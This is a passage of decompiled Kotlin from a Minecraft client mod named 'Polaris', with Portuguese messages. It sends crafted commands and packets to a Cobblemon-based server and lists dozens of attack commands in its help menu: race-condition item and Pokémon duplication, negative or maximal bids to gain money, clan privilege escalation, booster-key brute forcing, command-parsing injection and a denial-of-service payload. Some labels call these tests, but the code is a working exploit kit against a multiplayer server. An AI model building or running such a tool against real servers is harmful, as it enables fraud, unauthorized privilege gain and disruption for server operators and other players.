                  } catch (var3: java.lang.Throwable) {
                  }
               })
            }

            `this$0`.msg(`$source`, "   $`$n` disparados. Observe se algo se repetiu/dobrou no server.", class_124.field_1054)
            return@lambda_0 Unit.INSTANCE
         }
      })
   }

   private fun trialInjectionTests(source: FabricClientCommandSource) {
      this.msg(source, ">> F-Trial Injection: ${this.trialInjectionVariants.size()} variações", class_124.field_1075)
      this.msg(source, "   Rode como MEMBER. Qual passar é bypass via parsing fraco.", class_124.field_1054)
      var delayMs: Long = 0L

      for (variant in this.trialInjectionVariants) {
         this.pool.schedule({ 
            try {
               val var10000: class_634 = class_310.method_1551().method_1562()
               if (var10000 != null) {
                  var10000.method_45730(`$variant`)
               }

               `this$0`.msg(`$source`, "   -> '$`$displayVariant`'", class_124.field_1080)
            } catch (var5: java.lang.Throwable) {
               `this$0`.msg(`$source`, "   !! '$`$displayVariant`' erro: ${var5.getMessage()}", class_124.field_1061)
            }
         }, delayMs, TimeUnit.MILLISECONDS)
         delayMs += 400
      }

      this.pool.schedule({ 
         `this$0`.msg(`$source`, "<< Injection test terminado. Olha o chat — variações que passaram são fragilidades de parsing.", class_124.field_1075)
      }, delayMs + (long)500, TimeUnit.MILLISECONDS)
   }

   private fun drawCountdownOverlay(ctx: class_332) {
      val now: Long = System.currentTimeMillis()
      if (PolarisState.scenarioFlashUntil <= now) {
         val remainingMs: Long = PolarisState.scenarioCountdownEndsAt - now
         if (PolarisState.scenarioCountdownEndsAt - now > 0L) {
            val tr: class_327 = class_310.method_1551().field_1772
            val h: Int = ctx.method_51443()
            val cx: Int = ctx.method_51421() / 2
            val seconds: Int = RangesKt.coerceAtLeast((int)((remainingMs + 999L) / 1000L), 1)
            val label: java.lang.String = java.lang.String.valueOf(seconds)
            val scale: Float = if (seconds <= 3) 4.2F else 3.2F
            val y: Int = h / 2 - 44
            val pulse: Int = (int)((Math.sin((double)now / 80.0) + 1.0) * 22.0)
            val textColor: Int = if (seconds <= 3) this.color(255, 40 + pulse, 68 + pulse, 255) else this.color(255, 64, 82, 235)
            ctx.method_51448().method_22903()
            ctx.method_51448().method_22904((double)((float)cx - (float)tr.method_1727(label) * scale / 2.0F), (double)y, 0.0)
            ctx.method_51448().method_22905(scale, scale, 1.0F)
            ctx.method_25303(tr, label, 0, 0, textColor)
            ctx.method_51448().method_22909()
         }
      }
   }

   private fun openPendingGtsBackpack(mc: class_310) {
      if (PolarisState.pendingGtsBackpackOpen) {
         PolarisState.pendingGtsBackpackOpen = false
         PolarisState.blockGtsUi = false
         val allListings: java.util.List = PolarisState.pendingGtsBackpackAllListings
         val var4: java.util.Collection = PolarisState.pendingGtsBackpackMyListings
         val myListings: java.util.List = (if (PolarisState.pendingGtsBackpackMyListings.isEmpty()) PolarisState.latestGtsMyListings else var4) as java.util.List
         PolarisState.latestGtsMyListings = myListings
         PolarisState.latestGtsSnapshotAt = System.currentTimeMillis()
         PolarisState.pendingGtsBackpackAllListings = CollectionsKt.emptyList()
         PolarisState.pendingGtsBackpackMyListings = CollectionsKt.emptyList()
         mc.method_1507(GtsMyAuctionsScreen(allListings, myListings) as class_437)
      }
   }

   private fun drawSecondTwoOverlay(ctx: class_332) {
      val now: Long = System.currentTimeMillis()
      val remaining: Long = PolarisState.scenarioFlashUntil - now
      if (PolarisState.scenarioFlashUntil - now > 0L) {
         val tr: class_327 = class_310.method_1551().field_1772
         val w: Int = ctx.method_51421()
         val h: Int = ctx.method_51443()
         val cx: Int = w / 2
         val cy: Int = h / 2
         val alpha: Int = RangesKt.coerceIn((int)((double)RangesKt.coerceAtMost(remaining, 1200L) / 1200.0 * (double)210), 0, 210)
         val pulse: Int = (int)(Math.sin((double)now / 70.0) * 10)
         ctx.method_25294(0, 0, w, h, this.color(0, 0, 0, RangesKt.coerceIn(alpha / 3, 0, 70)))
         var label: Int = 110
         val hint: Int = ProgressionUtilKt.getProgressionLastElement(110, 28, -10)
         if (hint <= 110) {
            while (true) {
               val a: Int = RangesKt.coerceIn(alpha / 6 + (110 - label) / 4 + pulse / 2, 8, 95)
               ctx.method_25294(cx - label, cy - 2, cx + label, cy + 3, this.color(255, 226, 136, a))
               ctx.method_25294(cx - 2, cy - label, cx + 3, cy + label, this.color(255, 226, 136, a))
               if (label == hint) {
                  break
               }

               label -= 10
            }
         }

         this.drawHudPolaris(ctx, cx, cy - 18, 34 + RangesKt.coerceAtLeast(pulse, 0) / 2, alpha)
         ctx.method_51448().method_22903()
         ctx.method_51448().method_22904((double)(cx - tr.method_1727("AGORA") * 2 / 2), (double)(cy + 28), 0.0)
         ctx.method_51448().method_22905(2.0F, 2.0F, 1.0F)
         ctx.method_25303(tr, "AGORA", 0, 0, this.color(255, 241, 181, RangesKt.coerceIn(alpha, 80, 255)))
         ctx.method_51448().method_22909()
         ctx.method_27534(
            tr, class_2561.method_43470("CONFIRME O TRADE") as class_2561, cx, cy + 58, this.color(255, 226, 136, RangesKt.coerceIn(alpha, 80, 255))
         )
      }
   }

   private fun drawHudPolaris(ctx: class_332, x: Int, y: Int, size: Int, alpha: Int) {
      val gold: Int = this.color(255, 226, 136, RangesKt.coerceIn(alpha, 80, 255))
      val soft: Int = this.color(179, 142, 67, RangesKt.coerceIn((int)((double)alpha * 0.75), 50, 210))
      val white: Int = this.color(255, 255, 245, RangesKt.coerceIn(alpha, 90, 255))
      ctx.method_25294(x - size, y, x + size + 1, y + 2, gold)
      ctx.method_25294(x, y - size, x + 2, y + size + 1, gold)
      var i: Int = 1
      val var10: Int = RangesKt.coerceAtLeast(size / 2, 1)
      if (1 <= var10) {
         while (true) {
            ctx.method_25294(x - i, y - i, x - i + 2, y - i + 2, soft)
            ctx.method_25294(x + i, y - i, x + i + 2, y - i + 2, soft)
            ctx.method_25294(x - i, y + i, x - i + 2, y + i + 2, soft)
            ctx.method_25294(x + i, y + i, x + i + 2, y + i + 2, soft)
            if (i == var10) {
               break
            }

            i++
         }
      }

      ctx.method_25294(x - 2, y - 2, x + 4, y + 4, white)
   }

   private fun color(r: Int, g: Int, b: Int, a: Int = 255): Int {
      return RangesKt.coerceIn(a, 0, 255) shl 24 or RangesKt.coerceIn(r, 0, 255) shl 16 or RangesKt.coerceIn(g, 0, 255) shl 8 or RangesKt.coerceIn(b, 0, 255)
   }

   private fun send(source: FabricClientCommandSource, label: String, action: () -> Unit) {
      this.msg(source, ">> $label", class_124.field_1075)

      try {
         action()
         this.msg(source, "   OK (payload enviado)", class_124.field_1060)
      } catch (var5: java.lang.Throwable) {
         this.msg(source, "!! ${var5.getClass().getSimpleName()}: ${var5.getMessage()}", class_124.field_1061)
         var5.printStackTrace()
      }
   }

   private fun msg(source: FabricClientCommandSource, text: String, color: class_124) {
      source.sendFeedback(class_2561.method_43470("[POLARIS] $text").method_27692(color) as class_2561)
   }

   private fun printHelp(source: FabricClientCommandSource) {
      val mc: class_310 = class_310.method_1551()

      for (`element$iv` in CollectionsKt.listOf(
         arrayOf(
            "§b/polaris help §7- mostra esta lista",
            "§e--- UI ---",
            "§b[F8]                                     §7(abre tela do cenário de dupe c/ 3D)",
            "§e--- GTS ---",
            "§b/polaris gts list <slot> <price>",
            "§b/polaris gts auction <slot> <bid> <duration>",
            "§b/polaris gts bid <uuid> <amount>",
            "§b/polaris gts purchase <uuid>",
            "§b/polaris gts withdraw <uuid>",
            "§b/polaris gts fulfill <uuid> <slot>",
            "§b/polaris gts wondertrade <slot>",
            "§b/polaris gts trade <slot> <species> <minLvl> <shiny>",
            "§b/polaris gts spam_purchase <uuid> <n>  §7(race)",
            "§b/polaris gts race_pw <uuid> <n>        §7(purchase+withdraw)",
            "§b/polaris gts race_fulfill <uuid> <slot> <n>",
            "§b/polaris gts wt_cancel <slot> <delay_ms>",
            "§b/polaris gts spec_huge <slot>           §7(F-10 DoS)",
            "§b/polaris gts uuid                       §7(mostra UUID do listing selecionado)",
            "§b/polaris gts party                      §7(inspect party do Cobblemon, slots + tradeable)",
            "§b/polaris gts balance                    §7(mostra GTS balance cache)",
            "§e--- DUPE TESTS GTS ---",
            "§b/polaris gts list_burst <slot> <price> <n>     §7(N lists paralelos = race)",
            "§b/polaris gts list_replay <slot> <price> <n>    §7(N lists sequenciais)",
            "§b/polaris gts mass_list <price>                 §7(6 slots ao mesmo tempo)",
            "§b/polaris gts double_list <sA> <sB> <price>     §7(2 slots simultâneos)",
            "§b/polaris gts withdraw_burst <uuid> <n>         §7(N withdraws paralelos)",
            "§b/polaris gts self_purchase_test               §7(guia de auto-compra)",
            "§b/polaris gts trade_self <slot> <species>      §7(self-trade-by-spec)",
            "§b/polaris gts scenario_move_then_list <slot> <price>    §7(TOCTOU TRADE->list)",
            "§b/polaris gts scenario_list_then_trade <slot> <price>  §7(TOCTOU list->TRADE)",
            "§b/polaris gts scenario_list_countdown <slot> <price> <sec>  §7(list com countdown)",
            "§b/polaris gts scenario_list_autocheck <slot> <price>    §7(detecta auto se pokémon some)",
            "§b/polaris gts scenario_list_during_trade <slot> <price> <sec>  §7(F-17c trade+list)",
            "§b/polaris gts list_quick <slot> <price> <ms>            §7(list após ms, com block UI)",
            "§b/polaris gts purchase_garbage           §7(compra UUID aleatório)",
            "§b/polaris gts withdraw_garbage           §7(withdraw UUID aleatório)",
            "§e--- VALIDAÇÃO FINANCEIRA ---",
            "§b/polaris gts buy <uuid>                          §7(compra sem checar money local)",
            "§b/polaris gts buy_chain <uuid1,uuid2,...>         §7(N compras paralelas)",
            "§b/polaris gts buy_spam_different <uuid1,uuid2,..> §7(spam de uuids distintas)",
            "§b/polaris gts bid_excess <uuid> <amount>          §7(lance maior que seu balance)",
            "§b/polaris gts bid_max <uuid>                      §7(lance Long.MAX_VALUE)",
            "§b/polaris gts bid_negative <uuid> <amount>        §7(lance negativo, possível ganhar money)",
            "§b/polaris gts fulfill_wrong_slot <uuid> <slot>    §7(fulfill com pokémon errado)",
            "§b/polaris gts fulfill_empty <uuid>                §7(fulfill com slots 0-5 paralelo)",
            "§e--- SHOP ---",
            "§b/polaris shop sell <itemId> <qty>",
            "§b/polaris shop buy <itemId> <qty>",
            "§e--- CLAN ---",
            "§b/polaris clan create|invite|rename|color|upgrade|booster ...",
            "§b/polaris clan brute_booster              §7(F-09: tenta todas as chaves prováveis)",
            "§b/polaris clan booster_spam <key> <n>     §7(F-09: race condition)",
            "§e--- PRIV-ESC (escalação de cargo) ---",
            "§b/polaris clan whoami                     §7(mostra seu UUID e role atual)",
            "§b/polaris clan members                    §7(lista membros com UUIDs)",
            "§b/polaris clan promote_self               §7(tenta promover a si mesmo)",
            "§b/polaris clan promote_uuid <uuid>        §7(promove UUID específico)",
            "§b/polaris clan demote_uuid <uuid>         §7(rebaixa UUID específico)",
            "§b/polaris clan transfer_to_self          §7(vira owner sem permissão?)",
            "§b/polaris clan transfer_uuid <uuid>",
            "§b/polaris clan kick_uuid <uuid>",
            "§b/polaris clan promote_self_burst <n>     §7(race condition no promote)",
            "§b/polaris clan priv_esc_full              §7(sweep completo de ataques)",
            "§b/polaris clan trial_convocar             §7(testa bypass de /trial convocar como MEMBER)",
            "§b/polaris clan trial_entrar               §7(controle: comando permitido a membros)",
            "§b/polaris clan admin_command_audit        §7(testa todos comandos admin-only)",
            "§b/polaris clan trial_inject               §7(injection: case, espaços, selectors)",
            "§b/polaris clan cmd_spam <command>         §7(spam de comando arbitrário pra race)",
            "§e--- BATTLE FACTORY ---",
            "§b/polaris bf select|confirm|swap|start ...",
            "§e--- MODE TOGGLES (Mixin) ---",
            "§b/polaris mode block_gts_ui on|off       §7(bloqueia telas do GTS de abrir)",
            "§b/polaris mode block_shop_ui on|off",
            "§b/polaris mode block_clan_ui on|off",
            "§b/polaris mode status                    §7(mostra toggles ativos)",
            "§e--- PRESETS rapidos ---",
            "§b/polaris preset slot_negativo | slot_max | slot_min",
            "§b/polaris preset preco_zero | preco_negativo | preco_long_min | preco_long_max",
            "§b/polaris preset duracao_eterna",
            "§b/polaris preset bid_zero <uuid> | bid_negativo <uuid>",
            "§b/polaris preset shop_sell_neg <item> <qty>",
            "§b/polaris preset shop_buy_neg <item> <qty>",
            "§b/polaris preset booster_nao_owner <key>",
            "§b/polaris preset clan_nome_gigante | bf_confirm_huge"
         )
      )) {
         source.sendFeedback(class_2561.method_43470(`element$iv` as java.lang.String) as class_2561)
      }
   }
}
